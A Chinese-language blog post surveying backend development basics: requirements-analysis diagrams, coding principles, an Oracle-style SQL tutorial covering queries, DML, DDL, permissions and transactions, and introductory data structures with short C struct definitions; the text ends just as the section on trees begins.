---
title: 后端
date: 2025-01-15
author: htong
category: 后端开发
tags:
  - 后端
  - 数据库
  - 数据结构
  - 算法
  - 网络
---

# 后端开发知识体系

> 本文档涵盖后端开发的核心知识，包括需求分析、代码规范、数据库操作、数据结构与算法、计算机网络等内容。

<!-- more -->

## 目录

- [需求分析](#需求分析)
- [代码规范](#代码规范)
- [数据库](#数据库)
- [数据结构与算法](#数据结构与算法)
- [计算机网络](#计算机网络)

---

## 需求分析
## 需求分析方法

**3图1表**：流程图、用例图、时序图、功能列表

### 流程图
四要素：
- 对象：即执行人或产品中的用户。
- 输入：既可以是事件，也可以是动作。可以理解为前置条件。
- 动作：即产品中的操作，如点击、输入等。
- 输出：即结果或动作的目的。
一个流程会将这4个要素有序串联起来，而流程图则是承载上述程序的图形载体。

分类：根据流程图“流动”信息的不同，又可以细分为业务流程图、功能流程图、数据流程图等。
三大结构：顺序结构、选择结构、循环结构
路径规范
（1）绘制流程图时，为了提高流程图的逻辑性，应遵循从左到右、从上到下的顺序排列。
（2）一个流程从开始符开始，以结束符结束。开始符号只能出现一次，而结束符号可出现多次。若流程足够清晰，可省略开始、结束符号。
（3）同一流程图内，符号大小需要保持一致，连接线不能无故弯曲。
（4）流程处理关系为并行关系的，需要将流程放在同一高度。
（5）处理流程须以单一入口和单一出口绘制，同一路径的指示箭头应只有一个。

### 用例图
由参与者（Actor）、用例（Use Case）以及它们之间的关系构成的用于描述系统功能的动态视图。
### 时序图
时序图通过描述对象之间发送消息的时间顺序显示多个对象之间的交互模式。
纵向：时间轴，时间沿竖线向下延伸；
横向：代表了在协作中各独立对象的角色。

时序图元素
角色(Actor)：系统角色，可以是人或者其他系统，子系统。以一个小人图标表示。
对象（Object）：代表时序图中的对象在交互中所扮演的角色，一般借用矩形表示。
生命线（lifeline）：代表时序图中的对象在一段时期内的存在。
会话(Activation)：也叫激活框，它代表在对象生命线上某个阶段执行的操作，以一个偏窄的矩形表示。
消息（Message）：对象之间发送的信息。消息分为3种，同步消息、异步消息、返回消息。
组合片段（Fragments）:组合片段表示的是多个操作形成的组合操作，用于表达更加丰富的操作，常见的是循环、判断。

常用组合片段
抉择：或称条件分支，可根据不同的条件，执行不同的交互，类似于if-else语句。
循环片段：表明该片段会被重复执行，类似于while或for语句。
并行：并行处理，片段中的事件可以并行交错。相当于多线程。

### 功能列表
功能列表以列表的形式详细列出了软件系统将要实现的所有功能。
常用的要素：功能ID、功能模块、功能名称、功能描述、优先级、关联功能、责任人、状态 
功能性需求：
功能需求描述了软件应该做什么，它们定义了系统必须具备的功能或特性。这可以是计算、数据操作、业务流程、用户交互或其他任何定义系统可能执行的功能的特定功能。
非功能性需求：
是指依靠一些条件判断系统运作情形或其特性，而不是针对系统特定行为的需求。包括安全性、可靠性、互操作性、健壮性、易使用性、可维护性、可移植性、可重用性、可扩充性等。

![支付-时序图](/images/szkingdom/szbackend1.png)

## 代码规范

### 高质量的代码编写原则
- 每个变量只用于单一用途
- 每一行代码只表达一件事
- 一个循环只做一件事
- 单一抽象层次原则
- 函数应该遵守单一职责
- 函数圈复杂度应该小于10
- 函数第一原则是必须要短小
- 编写函数时必须一心一意、专注、怀有谦虚的心态

## 数据库

### 单表查询（DQL）
#### SELECT 语句基础
1. 查询所有字段
`SELECT * FROM employees;`
注意：* 会返回所有列，可能影响性能，建议在生产环境中指定具体字段。
2. 指定字段查询
`SELECT first_name, salary FROM employees;`
优点：减少数据传输量，提升查询效率。
3. 别名与计算
`SELECT first_name AS name, salary * 12 AS annual_salary FROM employees;`
别名（AS）：简化字段名或表名，增强可读性。
计算：支持算术运算（+, -, *, /）和表达式。
4. 去重查询（DISTINCT）
`SELECT DISTINCT department_id FROM employees;`
注意：DISTINCT 作用于整行数据，多列去重时需组合字段。
#### WHERE 条件过滤
1. 比较运算符
`SELECT * FROM employees WHERE salary > 5000;`
`SELECT * FROM employees WHERE job_title = 'Manager';`
常用运算符：=, >, <, >=, <=, <>（不等于）。
2. 范围与集合
`SELECT * FROM employees WHERE salary BETWEEN 3000 AND 8000;`
`SELECT * FROM employees WHERE department_id IN (10, 20);`
BETWEEN：包含边界值（如 3000 和 8000）。
IN：匹配集合中的任意一个值
3. 模糊匹配（LIKE）
`SELECT * FROM employees WHERE first_name LIKE 'A%';`
`SELECT * FROM employees WHERE first_name LIKE '%Smith%';`
`SELECT * FROM employees WHERE first_name LIKE '_a%';`
通配符：
%：匹配任意长度的字符（包括空字符）。
_：匹配单个字符。
4. 空值判断
`SELECT * FROM employees WHERE commission IS NULL;`
`SELECT * FROM employees WHERE commission IS NOT NULL;`
注意：NULL 表示缺失值，不能使用 = NULL 或 <> NULL 判断。
#### 排序（ORDER BY）
`SELECT first_name, salary FROM employees ORDER BY salary ASC;`
`SELECT first_name, salary FROM employees ORDER BY salary DESC;`
`SELECT department_id, salary FROM employees ORDER BY department_id ASC, salary DESC;`
排序规则：
ASC：升序（默认）。
DESC：降序。
多字段排序：逗号分隔字段，优先级从左到右递减。
#### 综合示例
示例 1：查询高薪员工
-- 查询工资高于 8000 且部门为 20 的员工，按工资降序排列
`SELECT first_name, salary, department_id FROM employees WHERE salary > 8000 AND department_id = 20 ORDER BY salary DESC;`
示例 2：模糊查询与去重
-- 查询名字包含 'John' 的唯一职位名称
`SELECT DISTINCT job_title FROM employees WHERE first_name LIKE '%John%';`
示例 3：计算与别名
-- 查询员工姓名、工资、年薪，并为年薪设置别名
`SELECT first_name AS name, salary, salary * 12 AS annual_salary FROM employees;`
五、注意事项
性能优化：
避免使用 SELECT *，仅选择必要字段。
**在大数据表中，LIKE 以 % 开头（如 `'%'）可能导致全表扫描，影响性能**。
空值处理：
NULL 值不会被 WHERE 条件中的 =, <> 等运算符匹配，必须使用 **IS NULL 或 IS NOT NULL**。
逻辑运算符优先级：
**AND 优先于 OR**，复杂条件需使用括号明确逻辑（如 (条件1 AND 条件2) OR 条件3）。

数据操作（DML）
一、插入数据（INSERT）
1. 单条插入
-- 插入单条记录，指定字段
`INSERT INTO employees (employee_id, first_name, salary, department_id) VALUES (101, 'John Doe', 5000, 20);`
-- 插入单条记录，省略字段名（需按表结构顺序提供值）
`INSERT INTO employees VALUES (102, 'Jane Smith', 6000, 30);	`
注意事项：
字段顺序需与值顺序一致。
字符串和日期需用单引号包裹（如 '2025-05-25'）。
主键或唯一约束字段的值不能重复。
二、更新数据（UPDATE）
1. 基础语法
`UPDATE employees SET salary = 5500 WHERE employee_id = 101;`
`UPDATE employees SET salary = salary * 1.1, department_id = 30 WHERE department_id = 20;`
注意事项：
必须带 WHERE 条件，否则会导致全表更新（所有行数据被修改）。
可使用表达式（如 salary * 1.1）或子查询更新数据。
2. 高级用法（结合子查询）
-- 根据其他表更新数据
`UPDATE employees SET salary = salary * 1.05 `
`WHERE department_id IN (SELECT department_id FROM departments WHERE location_id = 1700);`
三、删除数据（DELETE）
1. 基础语法
`DELETE FROM employees WHERE salary < 3000;`
注意事项：
必须带 WHERE 条件，否则会删除全表数据。
删除操作是可回滚的（通过事务控制）。
2. TRUNCATE 
`TRUNCATE TABLE employees;`
注意：
1）DELETE 每行操作记录日志，可回滚；而 TRUNCATE 不记录单行操作，不可回滚
2）DELETE 性能较慢（逐行删除）；而TRUNCATE 性能极佳（释放数据页）。
四、综合示例：
插入后立即更新
-- 插入新员工
`INSERT INTO employees (employee_id, first_name, salary, department_id) VALUES (107, 'Eve', 4000, 40);`
-- 更新其薪资
`UPDATE employees SET salary = 4200 WHERE employee_id = 107;`
五、注意事项
执行 DELETE 或 UPDATE 前，使用 SELECT 验证 WHERE 条件是否正确。
大数据量删除或更新时，分批次操作以减少锁竞争。
TRUNCATE 仅在快速清空表时使用。且无法回滚，需谨慎操作。

***表的创建与维护（DDL）***
一、创建表（CREATE TABLE）
1. 基本语法
> CREATE TABLE 表名 ( 列名1 数据类型 [约束条件], 列名2 数据类型 [约束条件], ...	);

示例：
> CREATE TABLE employees ( employee_id NUMBER PRIMARY KEY, first_name VARCHAR2(50) NOT NULL, salary NUMBER(10, 2), hire_date DATE );

1. 常用数据类型
| 数据类型 | 说明 | 示例 | 
| ---- | ---- | ------- |
| NUMBER | 	数值类型（可指定精度和小数位数） | 	NUMBER(10, 2) 表示最多10位，2位小数 | 
| VARCHAR2 | 可变长度字符串 | VARCHAR2(100) 最多100个字符 | 
| CHAR | 固定长度字符串 | 		CHAR(10) 不足10位用空格填充 | 
| DATE | 日期时间 | 	存储日期和时间（如 '2025-05-25'） | 
| BLOB | 二进制大对象（如图片、文件） | 	存储非结构化数据 | 

1. 约束条件
主键约束（PRIMARY KEY）：唯一标识每条记录，不允许 NULL。
非空约束（NOT NULL）：字段值不能为空。
唯一约束（UNIQUE）：字段值必须唯一。
默认值（DEFAULT）：为字段设置默认值。

二、修改表结构（ALTER TABLE）
1. 添加列
> ALTER TABLE 表名 ADD (新列名 数据类型 [约束条件]);

示例： `ALTER TABLE employees ADD (email VARCHAR2(100) UNIQUE NOT NULL,phone VARCHAR(20) DEFAULT '12345678900', created_at DATE DEFAULT SYSDATE );`
注意事项：新增列默认值为 NULL，若需非空（NOT NULL），需提供默认值（DEFAULT）。
2. 修改列
> ALTER TABLE 表名 MODIFY (列名 新数据类型 [约束条件]);

示例： `ALTER TABLE employees MODIFY (salary NUMBER(12, 2));`
注意事项：修改列类型时，需确保现有数据兼容新类型（如 VARCHAR2 扩展长度无影响，但缩小长度可能导致数据截断）。
3. 删除列
> ALTER TABLE 表名 DROP COLUMN 列名;

示例：`ALTER TABLE employees DROP COLUMN commission;`
注意事项：
删除列时，若该列有依赖（如索引、视图、触发器），需先删除依赖对象。
某些数据库（如 Oracle）支持 CASCADE CONSTRAINTS 级联删除关联约束。

三、删除表（DROP TABLE）
> DROP TABLE 表名 [PURGE];

示例：DROP TABLE employees PURGE;
参数说明：PURGE：立即删除表并释放空间（不可恢复）。若不加 PURGE，表可能进入回收站。
注意事项：
删除表会同时删除表中的数据、结构、索引和约束。
若表被其他对象（如视图、存储过程）引用，需先删除依赖对象。

***五、注意事项***
- 命名规范：
表名和列名应具有描述性（如 orders 而非 o）。
避免使用保留字（如 user, order）。
- 数据类型选择：
优先选择合适的数据类型以节省存储空间（如 CHAR 适合固定长度，VARCHAR2 适合可变长度）。
对日期时间使用 DATE 或 TIMESTAMP。
- 约束管理：
主键和唯一约束确保数据唯一性。
- 修改表结构的谨慎操作：
修改列类型或长度前，备份数据。
删除列前检查依赖对象（如索引、视图）。
- 删除表的不可逆性：
使用 DROP TABLE ... PURGE 前确保已备份重要数据。
生产环境中避免直接删除表，可使用 TRUNCATE 清空数据替代。

1. 用户权限（DCL）
(1) 创建用户
`CREATE USER username IDENTIFIED BY password;`
-- 示例：创建用户 finance_user，密码为 secure_pass
`CREATE USER finance_user IDENTIFIED BY secure_pass;`
注意：用户名需唯一，密码需符合复杂度要求。
(2) 授予权限
系统权限：控制用户对数据库整体操作的能力（如连接、创建对象、修改系统参数）。
-- 授予用户连接数据库的权限
`GRANT CREATE SESSION TO finance_user;`
-- 授予用户创建表、视图的权限
`GRANT CREATE TABLE, CREATE VIEW TO finance_user;`
-- 授予用户 DBA 角色（最高权限，需谨慎使用）
`GRANT DBA TO finance_user;`
(2) 授予权限
对象权限：控制用户对特定数据库对象（如表、视图）的操作权限。
-- 授予用户对 employees 表的 SELECT 和 INSERT 权限
`GRANT SELECT, INSERT ON hr.employees TO finance_user;`
-- 授予用户对 departments 表所有权限（SELECT, INSERT, UPDATE, DELETE 等）
`GRANT ALL ON hr.departments TO finance_user;`
角色权限：通过角色集中管理权限，简化权限分配。
-- 创建角色 FINANCE_READER
`CREATE ROLE finance_reader;`
-- 为角色授予权限
`GRANT SELECT ON hr.employees TO finance_reader;`
`GRANT SELECT ON hr.departments TO finance_reader;`
-- 将角色赋予用户
`GRANT finance_reader TO finance_user;`
(3) 回收权限
-- 回收系统权限
`REVOKE CREATE TABLE FROM finance_user;`
-- 回收对象权限
`REVOKE SELECT ON hr.employees FROM finance_user;`
-- 回收角色权限
`REVOKE finance_reader FROM finance_user;`
-- 删除用户（Oracle 中需加 CASCADE 删除用户所有对象）
`DROP USER finance_user CASCADE;`
注意事项：
回收权限可能影响依赖该权限的业务逻辑。
使用 CASCADE 删除用户时，会清除用户的所有对象（如表、视图）。

2. 事务控制（TCL）
(1) 提交与回滚
-- 开始事务（隐式启动）
`BEGIN;`
-- 执行操作
`INSERT INTO employees (employee_id, first_name, salary) VALUES (101, 'John', 5000);`
`UPDATE accounts SET balance = balance - 1000 WHERE account_id = 1;`
`UPDATE accounts SET balance = balance + 1000 WHERE account_id = 2;`
-- 提交事务（永久保存修改）
`COMMIT;`
-- 回滚事务（撤销所有操作）
`ROLLBACK;`

(1) 提交与回滚
事务特性（ACID）： 
- 原子性（Atomicity）：事务内的操作要么全成功，要么全失败。
- 一致性（Consistency）：事务执行前后，数据库状态保持一致。
- 隔离性（Isolation）：并发事务之间相互隔离。
- 持久性（Durability）：提交后的修改永久保存。

(2) 保存点（SAVEPOINT）
用途：允许部分回滚，避免整个事务被撤销。
-- 设置保存点
`SAVEPOINT sp1;`
-- 执行操作
`UPDATE orders SET status = 'Shipped' WHERE order_id = 1001;`
-- 回滚到保存点
`ROLLBACK TO sp1;`
-- 释放保存点
`RELEASE SAVEPOINT sp1;`
综合示例
示例 1：权限管理
-- 创建用户并授予权限
`CREATE USER finance_reader IDENTIFIED BY secure_pass;`
`ALTER USER finance_reader DEFAULT TABLESPACE users QUOTA UNLIMITED ON users;`
-- 创建角色并授予权限
`CREATE ROLE finance_reader_role;`
`GRANT SELECT ON hr.employees TO finance_reader_role;`
`GRANT SELECT ON hr.departments TO finance_reader_role;`
-- 将角色赋予用户
`GRANT finance_reader_role TO finance_reader;`
示例 2：事务控制
> -- 转账事务
> BEGIN;
> UPDATE accounts SET balance = balance - 1000 WHERE account_id = 1;
> UPDATE accounts SET balance = balance + 1000 WHERE account_id = 2;
> COMMIT;
-- 异常处理（伪代码）
> BEGIN TRY
>   BEGIN TRANSACTION;
>     -- 操作
>     COMMIT TRANSACTION;
> END TRY
> BEGIN CATCH
>     ROLLBACK TRANSACTION;
> END CATCH;

1. ***单行函数：***
单行函数对每一行数据进行处理并返回单一结果，常用于数据转换、格式化或计算。
(1) 字符函数
UPPER(str)：将字符串转换为大写	
示例：`SELECT UPPER('hello') FROM dual;` → HELLO
LOWER(str)：将字符串转换为小写	
示例：`SELECT LOWER('HELLO') FROM dual;` → hello
SUBSTR(str, start, length)：截取子字符串	
示例：`SELECT SUBSTR('abcdef', 2, 3) FROM dual;` → bcd

(2) 数值函数
ROUND(n, decimal)：四舍五入到指定小数位	
示例：`SELECT ROUND(123.456, 2) FROM dual;` → 123.46
TRUNC(n, decimal)：截断到指定小数位	
示例：`SELECT TRUNC(123.987) FROM dual;` → 123
MOD(a, b)：取余运算	
示例：`SELECT MOD(10, 3) FROM dual;` → 1

(3) 日期函数
SYSDATE	：获取当前系统日期和时间	
示例：`SELECT SYSDATE FROM dual;`
ADD_MONTHS(date, n)：在日期上加 n 个月	
示例：`SELECT ADD_MONTHS(SYSDATE, 3) FROM dual;` → 三个月后的日期
`MONTHS_BETWEEN(date1, date2)`：计算两个日期之间的月数差	
示例：`SELECT MONTHS_BETWEEN('2023-01-01', '2022-01-01') FROM dual;` → 12
`TO_CHAR(date, 'format')` ：日期格式化为字符串	
示例：`SELECT TO_CHAR(SYSDATE, 'YYYY-MM-DD HH24:MI:SS') FROM dual;`

2. ***聚合函数与分组查询***
聚合函数对一组数据进行统计计算并返回单一结果，常与 GROUP BY 结合使用。

(1) 聚合函数
COUNT(*)：统计总行数
示例：`SELECT COUNT(*) FROM employees;`
COUNT(column)：统计非空值的行数
示例：`SELECT COUNT(manager_id) FROM employees;`
SUM(column)：计算列的总和	
示例：`SELECT SUM(salary) FROM employees WHERE department_id = 10;`
AVG(column)：计算列的平均值	
示例：`SELECT AVG(salary) FROM employees;`
MIN(column)：获取列的最小值	
示例：`SELECT MIN(hire_date) FROM employees;`
MAX(column)：获取列的最大值	
示例：SELECT MAX(salary) FROM employees;
(2) 分组查询：通过 GROUP BY 对数据分组后应用聚合函数。
基本语法：
> SELECT column1, column2, ..., aggregate_function(column) FROM table_name
> WHERE condition
> GROUP BY column1, column2, ...
> HAVING group_condition
> ORDER BY column1, column2, ...;

示例
--按部门分组统计平均工资
`SELECT department_id, AVG(salary) AS avg_salary FROM employees GROUP BY department_id;`
--按部门和职位分组统计员工数量
`SELECT department_id, job_id, COUNT(*) AS employee_count FROM employees	GROUP BY department_id, job_id;`
--使用 HAVING 过滤分组
`SELECT department_id, AVG(salary) AS avg_salary FROM employees GROUP BY department_id HAVING AVG(salary) > 2000;`
注意事项：
SELECT 列限制：除聚合函数外，所有字段必须包含在 GROUP BY 中。
-- 正确
`SELECT department_id, job_id, AVG(salary) FROM employees GROUP BY department_id, job_id;`

-- 错误（job_id 未在 GROUP BY 中）
`SELECT department_id, job_id, AVG(salary) FROM employees GROUP BY department_id;`

WHERE 与 HAVING 的区别：
WHERE：在分组前过滤行（不能使用聚合函数）。
HAVING：在分组后过滤组（可以使用聚合函数）。

NULL 值处理：聚合函数自动忽略 NULL 值（如 COUNT(column) 不统计 NULL 行）。

综合示例
示例 1：单行函数与聚合函数结合
-- 查询员工姓名、入职年份及部门编号
`SELECT first_name AS name, TO_CHAR(hire_date, 'YYYY') AS hire_year, department_id FROM employees;`
-- 查询各部门的平均工资（保留两位小数）
`SELECT department_id, ROUND(AVG(salary), 2) AS avg_salary FROM employees GROUP BY department_id;`
示例 2：分组统计与 HAVING
-- 查询员工人数大于 5 的部门
`SELECT department_id, COUNT(*) AS employee_count FROM employees GROUP BY department_id HAVING COUNT(*) > 5;`

-- 查询平均工资高于公司平均工资的部门
`SELECT department_id, AVG(salary) AS avg_salary FROM employees GROUP BY department_id HAVING AVG(salary) > (SELECT AVG(salary) FROM employees);`

使用建议：
性能优化：
避免在 GROUP BY 中使用不必要的字段。
对分组字段（如 department_id）创建索引以加速查询。
空值处理：
使用 `NVL(column, default_value)` 替代空值，避免聚合计算错误。
示例：`SELECT AVG(NVL(commission_pct, 0)) FROM employees;`


内连接（INNER JOIN）与外连接（OUTER JOIN）的核心区别‌在于它们对‌不匹配行的处理方式不同‌：
‌内连接（INNER JOIN）‌：仅返回两个表中‌根据连接条件匹配的行‌，不匹配的行会被完全排除。
‌外连接（OUTER JOIN）‌：除了返回匹配的行外，还会保留‌至少一个表中所有行‌，即使在另一个表中没有匹配项，未匹配部分用 NULL 填充。

1. ***多表连接（JOIN）***
(1) 内连接（INNER JOIN）:返回两个表中满足连接条件的行。
-- 查询员工及其所属部门名称。
`SELECT e.employee_id, e.name, d.department_name FROM employees e INNER JOIN departments d ON e.department_id = d.department_id;`
仅返回两表中 department_id 匹配的行，未匹配的记录被过滤。

(2) 外连接（OUTER JOIN）
左外连接（LEFT JOIN）：返回左表所有行，右表无匹配时填充 NULL。
-- 查询所有员工（包括未分配部门的员工），部门字段为 NULL。
`SELECT e.employee_id, e.name, d.department_name FROM employees e LEFT JOIN departments d ON e.department_id = d.department_id;`

右外连接（RIGHT JOIN）：返回右表所有行，左表无匹配时填充 NULL。
-- 查询所有部门（包括无员工的部门），员工字段为 NULL。
`SELECT e.employee_id, d.department_name FROM employees e RIGHT JOIN departments d ON e.department_id = d.department_id;`

全外连接（FULL JOIN）：返回两表所有行，不匹配时填充 NULL。
-- 查询所有员工和部门信息，未匹配的部分用 NULL 填充。
`SELECT e.name, d.department_name FROM employees e FULL JOIN departments d ON e.department_id = d.department_id;`

(3) 自连接（Self Join）：将表与自身关联，常用于层级数据（如员工与上级关系）。
-- 查询员工及其直属上级
`SELECT e1.name AS employee, e2.name AS manager FROM employees e1 INNER JOIN employees e2 ON e1.manager_id = e2.employee_id;`
通过别名 e1 和 e2 实现表的自关联，查询员工的上级姓名。

(4) 性能优化建议
数据量较小：优先使用子查询（如 IN 或 EXISTS）。
数据量较大：优先使用 JOIN，并通过 执行计划 分析执行效率。
避免笛卡尔积：确保连接条件明确，防止两表所有行组合（CROSS JOIN）。
索引优化：在连接字段（如 department_id）上创建索引，加速查询。

***如何在连接字段上创建索引？‌***
‌1. 单字段索引‌
适用于单列连接条件：
-- 为 orders 表的 user_id 字段创建索引
`CREATE INDEX idx_order_user ON orders(user_id);`
`ALTER TABLE table_name ADD INDEX idx_name (column_name);`

2. ***子查询（Subquery）***
子查询是嵌套在主查询中的查询语句，常用于条件过滤、字段计算或表来源。
(1) 标量子查询（Scalar Subquery）：返回单个值（一行一列），可作为字段或条件使用。
-- 查询工资高于公司平均工资的员工
`SELECT employee_id, name, salary FROM employees WHERE salary > (SELECT AVG(salary) FROM employees);`
子查询在主查询前执行一次，结果被主查询复用。

(2) 行级子查询
单行子查询：返回一行一列，使用单行比较符（>, =, < 等）。
-- 查询工资等于 'Abel' 的员工
`SELECT last_name, salary FROM employees WHERE salary = (SELECT salary FROM employees WHERE last_name = 'Abel');`

(2) 行级子查询
多行子查询：返回多行一列，需搭配 IN, ANY, ALL 等操作符。
-- 查询工资大于部门 10 中任意一人的员工
`SELECT last_name, salary FROM employees WHERE salary > ANY (SELECT salary FROM employees WHERE department_id = 10);`
操作符：
=ANY：等价于 IN。
>ANY：大于子查询结果中的某个值。
>ALL：大于子查询结果中的所有值。

(3) EXISTS 与 IN
EXISTS ：判断子查询是否返回非空结果集，效率通常高于 IN。
-- 查询已选课程的学生
`SELECT * FROM students s WHERE EXISTS ( SELECT 1 FROM course_selection cs WHERE cs.student_id = s.student_id );`
一旦找到匹配项立即停止搜索，适合大数据量场景。
IN ：匹配字段值是否在子查询结果集中。
-- 查询姓张或李的学生
`SELECT * FROM students WHERE last_name IN ('张', '李');`
需先计算子查询结果集，适合结果集较小的场景。

(4) 子查询建议
避免嵌套过深：复杂子查询可拆分为临时表（WITH 子句）。
性能优化：
使用 EXISTS 替代 IN（尤其在子查询返回大量数据时）。
在子查询字段上创建索引。
子查询需包含在括号内。
单行操作符（如 =）对应单行子查询，多行操作符（如 IN）对应多行子查询。

3. 注意事项
JOIN 与子查询的选择：
JOIN：适合需要组合多表数据的场景（如返回两表字段）。
子查询：适合条件依赖其他表的场景（如过滤或计算字段）。

性能对比：
EXISTS 通常比 IN 更高效，因为它在找到第一个匹配项后立即停止搜索。
对于大数据量，优先使用 JOIN；对于小数据量，使用子查询更直观。

## 代码规范的原则
原则一：首先是为人编写程序，其次才是计算机
这是软件开发的基本要点，软件的生命周期贯穿产品的开发、测试、生产、用户使用、版本升级和后期维护等长期过程，只有易读、易维护的软件代码才具有生命力。
原则二：保持代码的简明清晰，避免过分的编程技巧
简单是最美。保持代码的简单化是软件工程化的基本要求。不要过分追求技巧，否则会降低程序的可读性。
原则三：编程时首先达到正确性，其次考虑效率
编程首先考虑的是满足正确性、健壮性、可维护性、可移植性等质量因素，其次考虑程序的效率和资源占用。
原则四：保持一致性，尽可能多的使用相同的规则
保持代码可维护性的一种方法就是强调编码的一致性。程序员能快速查看并理解其他程序员的代码是很重要的。维持一种统一风格并遵照惯例意味着我们可以简单地使用“模式匹配”来推断大量符号的含义和其不变性。建立通用、惯例和模式使代码更容易理解。也许有时有必要改变我们的一贯风格，尽管如此，我们还是尽量保持一致性的好。
原则五：尽可能复用，修正原有的代码
尽量选择可借用的代码，对其修改优化以达到自身要求。
原则六：尽量减少同样的错误出现的次数
事实上，我们无法做到完全消除错误，但通过不懈的努力，可以减少同样的错误出现的次数。

## 数据结构与算法

### 基础概念

数据结构是计算机存储、组织数据的方式，包括逻辑结构（如线性、树形、图）和物理结构（如顺序存储、链式存储）。它直接影响程序的效率、可维护性和资源消耗，是优化算法性能的基础。

#### 算法核心特征
算法是解决特定问题的有限步骤序列，具有输入、输出、确定性、可行性和有穷性。高效的算法能显著降低时间复杂度和空间复杂度，例如快速排序（O(n log n)）比冒泡排序（O(n²)）更高效。
#### 二者协同作用
数据结构为算法提供操作对象，而算法通过优化数据操作（如查找、排序）体现数据结构的价值。例如哈希表（O(1)查找）需配合哈希算法实现高效数据检索。

#### 重要性
1. 提升程序性能
时间复杂度：算法效率直接影响程序运行速度。
空间复杂度：合理的数据结构可减少内存占用。
2. 降低开发成本
复用性：可避免重复造轮子。
可维护性：代码更易读、易扩展。
3. 解决复杂问题
动态规划：解决背包问题、最长公共子序列。
图算法：解决最短路径问题，迷宫求解。
4. 推动技术创新
AI与机器学习：深度学习依赖矩阵运算和优化算法。
区块链：哈希表和链表实现去中心化存储，共识算法（如PoW）依赖高效的随机数生成和验证。

#### 应用场景
1. 搜索场景：索引搜索
倒排索引、哈希表、PageRank算法
BM25算法
2. 路径规划：地图导航
图、Dijkstra算法(最短路径)、A*算法（结合启发式函数（如直线距离），加速动态路径规划）
3. 数据库索引：快速查询
   B+树：平衡树结构，支持高效范围查询和排序。
二分查找：在B+树节点中快速定位数据。
4. 社交网络：好友推荐
   图：节点表示用户，边表示好友关系。
广度优先搜索：查找用户的好友及其好友。
协同过滤算法：基于用户相似度推荐好友。
5. 实时行情处理：涨跌幅排行榜
   优先队列（基于堆） 、哈希表，快速排序用优先队列按价格排序，优先处理高价/低价股票。哈希表存储股票代码到行情数据的映射，查询时间从O(n)降至O(1)

***数组***是一种线性数据结构，用于存储相同类型的一组元素。它通过索引（下标）来访问元素，索引从0开始，依次递增。
- 内存连续：数组元素在内存中是连续存储的，这使得访问效率极高。
- 静态数组：在编译时确定大小，元素在内存中连续存储，大小固定不可变。
- 动态数组：在运行时动态调整大小，支持自动扩容和缩容。
- 时间复杂度：查询O(1)，插入/删除O(n)

***链表***由一系列节点（Node）组成，每个节点包含两部分：
数据域：存储元素的值（如整数、字符、对象等）。
指针域：指向下一个节点的内存地址（单向链表），或同时指向前一个节点和下一个节点（双向链表）。

| **特点** | **详细说明** |  **与数组的对比** |
| ---  | ----- |  -----------  |
| 动态大小 | 链表长度可动态调整，无需预先分配固定内存。 | 数组大小固定，创建时需指定长度。 |
| 非连续存储 | 节点在内存中分散存储，通过指针逻辑连接。 | 数组元素在内存中连续存储。 |
| 插入删除效率高 |  已知位置插入或删除节点时，只需修改指针，时间复杂度为O(1)。 | 插入或删除元素需移动大量数据，时间复杂度为O(n)   |
| 随机访问效率低  | 需从头节点开始遍历，时间复杂度为O(n)  | 支持随机访问，时间复杂度为O(1)  |

单链表、双向链表、循环链表

***链表使用场景***
动态数据管理:数据量不确定或频繁波动的场景(如实时传感器数据、社交网络动态消息)无需预先分配固定内存，节点可按需动态增删，避免空间浪费。
高频插入/删除操作：需要频繁在任意位置增删元素的场景。如文本编辑器的撤销/重做功能、操作系统进程调度。
音乐播放列表:使用循环链表实现歌曲循环播放，尾节点指向头节点，形成闭环逻辑。
动态数据结构:如数据栈、队列或哈希表的链式实现。

栈是一种操作受限的线性数据结构，其数据元素遵循后进先出（Last In First Out, LIFO）原则，即最后一个插入的元素最先被删除。栈的所有操作仅允许在栈顶（Top）进行，另一端称为栈底（Bottom）。
***特点***
**后进先出**（LIFO）：最后一个入栈的元素最先出栈，类似于“叠盘子”：后放入的盘子会被先取出。
操作受限：仅允许在栈顶进行插入（push）和删除（pop）操作，不支持随机访问中间元素。
动态性：栈的容量可以动态扩展或收缩（取决于实现方式），无需预先固定大小（如链式栈）。
时间复杂度高效：push() 和 pop() 操作的时间复杂度均为 O(1)

```c
typedef struct { 
     int *array; // 动态数组存储元素
     int top; // 栈顶指针（当前元素索引） 
     int capacity; // 栈的当前容量
 }Stack; 

// 定义链式栈节点 
typedef struct StackNode { 
int data; // 数据域（可根据需求修改类型） 
struct StackNode *next; // 指针域，指向下一个节点 
} StackNode; 
// 定义链式栈结构 
typedef struct { 
StackNode *top; // 栈顶指针 
} LinkedStack; 
```
### 基本数据结构-栈使用场景
![基本数据结构-栈使用场景](/images/szkingdom/szbackend2.png)

## 队列
队列（Queue）是一种特殊的线性数据结构，遵循 先进先出（FIFO, First In First Out） 原则。其核心操作包括：
入队（Enqueue）：将元素添加到队尾（Rear/Tail）。
出队（Dequeue）：从队头（Front/Head）移除元素。

***特点：***
**先进先出**（FIFO）：最先进入队列的元素最先被处理，类似于排队场景（如超市结账）。
操作受限：仅允许在队尾添加元素，仅允许在队头移除元素。
实现方式：数组实现、链表实现。
时间复杂度高效：入队/出队时间复杂度为O(1)，查询时间复杂度为O(n)。

***数组实现队列：***
```c
typedef struct {    
  int items[MAX_SIZE];   
  int front;      // 队头指针    
  int rear;       // 队尾指针    
  int count;      // 当前元素个数
} Queue;
 // 初始化队列
void initQueue(Queue *q) 
{    q->front = 0;    
  q->rear = -1;    
  q->count = 0;
}
```

***链表实现队列***
```c
// 队列结构定义
typedef struct {    
  Node *front;  // 队头指针    
  Node *rear;   // 队尾指针    
  int count;    // 当前元素个数
} Queue; 
// 队列节点定义
typedef struct Node {    
  int data;    
  struct Node *next;
} Node; 
```

### 基本数据结构-队列使用场景
![基本数据结构-队列使用场景](/images/szkingdom/szbackend3.png)

| 数据结构 | 存储方式 | 访问效率 | 插入/删除效率 | 典型应用 |
| ------- |--------- | ------- | ------------ | ------- |
| 数组   | 连续内存  | O(1)(随机访问) | O(n)(中间插入/删除 ) | 数据库数据页、矩阵运算 |
| 链表   | 离散内存 | O(n)(随机访问)  | O(1)(已知位置) | LRU缓存、栈/队列实现 |
| 栈    | 数组/链表 | O(1)(栈顶操作) | O(1)(栈顶操作) | 表达式求值、函数调用栈 |
| 队列   | 数组/链表 | O(1)(对头/队尾操作) | O(1)(对头/队尾操作) | 任务调度、BFS |

***树***（Tree）是一种非线性数据结构，由节点（Node）和边（Edge）组成，具有层次关系。它模拟了自然界中树的结构：
根节点（Root）：唯一没有父节点的节点，位于树的顶层。
